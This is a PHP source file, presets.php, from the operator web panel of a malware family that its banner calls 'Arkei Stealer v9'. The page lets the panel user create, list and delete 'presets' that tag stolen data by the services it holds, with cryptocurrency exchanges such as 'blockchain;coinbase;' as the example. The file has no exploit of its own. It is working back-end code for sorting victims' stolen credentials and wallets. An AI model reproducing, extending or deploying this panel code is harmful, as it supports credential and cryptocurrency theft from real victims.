<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [presets.php]
*    Presets
*/

session_start();

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$pageName = "Presets";

$name 		= checkParam($_POST["name"]);
$services 	= checkParam($_POST["services"]);
$color	 	= checkParam($_POST["color"]);

$action 	= checkParam($_GET["action"]);
$id			= checkParam($_GET["id"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$name 		= mysqli_real_escape_string($database, $name);
	$services	= mysqli_real_escape_string($database, $services);
	$color		= mysqli_real_escape_string($database, $color);
	
	if($name != null & $services != null & $color != null)
	{
		$database->query("INSERT INTO `presets`(`id`, `name`, `services`, `color`) VALUES ('','$name','$services','$color')");
	}
	
	if($action == "delete")
	{
		$id = mysqli_real_escape_string($database, $id);
		
		$database->query("DELETE FROM `presets` WHERE `id`='$id'");
	}
	
	$presets = $database->query("SELECT * FROM `presets`;");
}

require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="page-title">Create Preset</h4>
                        </div>
                    </div>
                </div>     
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="header-title"></h4>
    
                                <form class="form-horizontal" action="" method="POST">
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Name</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Crypto" value="" name="name" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Services</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="blockchain;coinbase;" value="" name="services" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Color</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="color">
                                                <option style="background-color: green;" value="green">Green</option>
                                                <option style="background-color: teal;" value="teal">Teal</option>
												<option style="background-color: steelblue;" value="steelblue">Blue</option>
												<option style="background-color: navy;" value="navy">Navy</option>
												<option style="background-color: firebrick;" value="firebrick">Red</option>
												<option style="background-color: coral;" value="coral">Coral</option>
												<option style="background-color: orangered;" value="orangered">Orange</option>
												<option style="background-color: gold;" value="gold">Gold</option>
												<option style="background-color: violet;" value="violet">Violet</option>
												<option style="background-color: indigo;" value="indigo">Indigo</option>
												<option style="background-color: black;" value="black">Black</option>
                                            </select>
                                        </div>
                                    </div>
									
									<button type="submit" class="btn btn-primary">Create</button>
    
                                </form>
    
                            </div> <!-- end card-box -->
                        </div> <!-- end card-->
                    </div><!-- end col -->
                </div> 
            </div> <!-- end container -->

	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
				
					<h4 class="page-title">Presets</h4>
				</div>
			</div>
		</div> 
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
						<h4 class="header-title">Presets</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>ID</th>
											<th>Name</th>
											<th>Services</th>
											<th>Color</th>
											<th>Actions</th>
										</tr>
									</thead>
									
									<tbody>
									<?php
									while ($preset = $presets->fetch_assoc())
									{
									
									?>
										<tr>
											<td><b>#<? echo $preset["id"]; ?></b></td>
											<td><? echo $preset["name"]; ?></td>
											<td><? echo $preset["services"]; ?></td>
											<td style="color: <? echo $preset["color"]; ?>"><? echo $preset["color"]; ?></td>
											<td><a href="presets.php?action=delete&id=<? echo $preset["id"]; ?>" >Delete</a></td>
										</tr>
										
									<?php
									}
									?>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php
require("template/footer.tmpl.php");

?>